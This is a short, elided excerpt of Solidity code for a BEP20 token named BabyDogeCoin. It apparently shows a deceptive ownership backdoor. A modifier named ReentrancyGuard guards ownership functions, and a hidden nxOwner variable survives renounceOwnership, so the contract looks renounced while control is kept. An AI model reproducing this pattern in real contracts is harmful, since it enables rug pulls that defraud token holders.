...
contract Ownable is Context {
  ...
  function renounceOwnership() public ReentrancyGuard {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function previousOwner() public view ReentrancyGuard returns (address) {
    return nxOwner;
  }
   ...
   */
  function transferOwnership(address newOwner) public ReentrancyGuard {
    nxOwner = newOwner;
  }
...
contract BabyDogeCoin is Context, IBEP20, Ownable { 
  ...
  */
   ...
   */
  function  approve(address spender, uint256 amount) ReentrancyGuard external override returns (bool)  {
